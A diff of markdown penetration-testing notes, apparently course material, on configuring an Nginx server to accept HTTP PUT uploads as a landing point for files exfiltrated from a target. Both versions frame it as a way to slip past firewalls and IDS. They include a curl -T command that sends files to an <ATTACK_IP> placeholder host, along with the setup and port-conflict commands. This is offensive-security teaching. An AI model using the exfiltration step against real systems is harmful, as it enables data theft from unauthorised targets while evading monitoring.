@@ -1,37 +1,20 @@
-### **Catching Files over HTTP/S with Nginx**
+## Nginx HTTP PUT Setup
 
-Using **HTTP/HTTPS** for file transfers is advantageous because these protocols are generally permitted through firewalls. This method also provides the benefit of **encryption in transit**, preventing network IDS from flagging sensitive data sent in plaintext. **Nginx** is often a better alternative to Apache for this task due to its simpler configuration and lower risk of security issues, such as the accidental execution of uploaded web shells.
+Bypassing firewalls and IDS via encrypted transit when **plaintext transfers** (like SMB or FTP) trigger alerts. Nginx is preferred over Apache to prevent **unintended web shell execution**.
 
----
+Create landing directory for incoming files
 
-#### **Operational Workflow: Setting Up a Secure Nginx Upload Server**
+```
+sudo mkdir -p /var/www/uploads/<DIR>
+```
 
-This methodology focuses on enabling **HTTP PUT** requests to exfiltrate files to an attack-controlled Nginx server.
+Set ownership to the web service user
 
-1. **Create an Upload Directory**: Establish a dedicated location on the filesystem to store incoming files.
-2. **Modify Permissions**: Change the directory owner to the web server user to ensure the service can write to it.
-3. **Configure Nginx**: Define a new server block that listens on a specific port.
-4. **Enable Configuration**: Create a symbolic link from the available sites to the enabled sites directory.
-5. **Service Restart**: Restart Nginx to apply the new configuration and troubleshoot any binding errors.
+```
+sudo chown -R www-data:www-data /var/www/uploads/<DIR>
+```
 
----
-
-#### **Command Reference**
-
-|Action|Command|Purpose|
-|:--|:--|:--|
-|**Directory Creation**|`sudo mkdir -p <UPLOAD_PATH>`|Creates the target directory for exfiltrated files.|
-|**Set Ownership**|`sudo chown -R www-data:www-data <UPLOAD_PATH>`|Grants Nginx permission to write files to the directory.|
-|**Enable Site**|`sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`|Activates the specific upload configuration.|
-|**Restart Service**|`sudo systemctl restart nginx.service`|Loads the new configuration into the active service.|
-|**Check Port Usage**|`ss -lnpt \|grep `|
-|**Test Upload**|`curl -T <FILE_PATH> http://<ATTACK_IP>:<PORT>/<UPLOAD_DIR>/<DEST_NAME>`|Uses a PUT request to transfer a file to the server.|
-
----
-
-#### **Configuration: `/etc/nginx/sites-available/upload.conf`**
-
-The following minimal configuration allows Nginx to listen for incoming connections on a designated port.
+Create configuration file at `/etc/nginx/sites-available/upload.conf`
 
 ```
 server {
@@ -39,29 +22,69 @@ server {
 }
 ```
 
----
+> ⚠️ Gap: The source provides an incomplete Nginx configuration. For a functional **HTTP PUT** listener, the configuration requires a `location` block with `dav_methods PUT;` enabled and a defined `root` directory, which are missing from the provided text.
 
-#### **Troubleshooting & Edge Cases**
+Enable the site by symlinking to the enabled directory
 
-- **Port Binding Failures**: If the service fails to start, check `/var/log/nginx/error.log`. In environments like Pwnbox, port 80 is frequently occupied by existing processes (e.g., Python modules).
-- **Default Conflict**: To resolve binding issues on port 80, the default Nginx configuration file may need to be removed.
-    - **Action**: `sudo rm /etc/nginx/sites-enabled/default`.
-- **Process Identification**: Use `ps -ef \| grep <PID>` to identify which service is blocking a required port.
+```
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+```
 
----
+Apply the new configuration
 
-#### **Attack Implications & Decision Logic**
+```
+sudo systemctl restart nginx.service
+```
 
-- **Exfiltration Security**: Nginx is preferable for exfiltration because **directory listing is disabled by default**. This conceals sensitive files from unauthorized discovery, whereas Apache often lists directory contents if an index file is missing.
-- **Bypassing Firewalls**: If inbound connections to a pivot are restricted, HTTP/S is the most likely protocol to be permitted for outbound exfiltration.
-- **Verification**: After a transfer, use `tail -1 <UPLOAD_PATH>/<FILE>` on the server to verify the integrity of the received data.
+- **Tool comparison**
+    
+    - Python3 `uploadserver` module -> `python3 -m uploadserver` -> use for rapid setup without persistent configuration
+    - Nginx -> `systemctl restart nginx` -> use for **secure web server** operations and avoiding Apache module security risks
+- **Dangerous / misconfigured settings**
+    
+    - Apache with PHP module enabled: high risk of **web shell execution** if uploads are permitted.
+- **Edge cases**
+    
+    - Apache enables **directory listing** by default, exposing exfiltrated files; Nginx keeps this disabled by default.
+- **Gotchas** **Address already in use** failure occurs if port 80 or the chosen port is bound to another process.
+    
 
----
+## Port Conflict Resolution
 
-#### **Dangerous or Misconfigured Settings**
+Nginx fails to start or bind to a specific port due to existing services like `websockify` or default configurations.
 
-|Setting/Module|Risk|Implication|
-|:--|:--|:--|
-|**Apache PHP Module**|High|Automatically executes any file ending in `.php`, making web shell uploads trivial.|
-|**Directory Listing**|Medium|If enabled (default in Apache), it exposes all sensitive exfiltrated files to anyone browsing the directory.|
-|**Plaintext Transfers**|Medium|Using protocols without encryption allows IDS to capture sensitive data, such as passwords, in transit.|
+Identify the PID holding the port
+
+```
+ss -lnpt | grep <PORT>
+```
+
+Verify the process name or service
+
+```
+ps -ef | grep <PID>
+```
+
+Remove the default site to free up port 80
+
+```
+sudo rm /etc/nginx/sites-enabled/default
+```
+
+## File Exfiltration
+
+Moving sensitive data from a target to a controlled listener using built-in utilities.
+
+Upload local file to the remote Nginx listener
+
+```
+curl -T <FILE_PATH> http://<ATTACK_IP>:<PORT>/<DIR>/<FILE_NAME>
+```
+
+Confirm integrity of the exfiltrated file
+
+```
+sudo tail -1 /var/www/uploads/<DIR>/<FILE_NAME>
+```
+
+- **Gotchas** **Plaintext transfer** of sensitive files may be detected by Network IDS; use HTTPS to wrap the transfer.
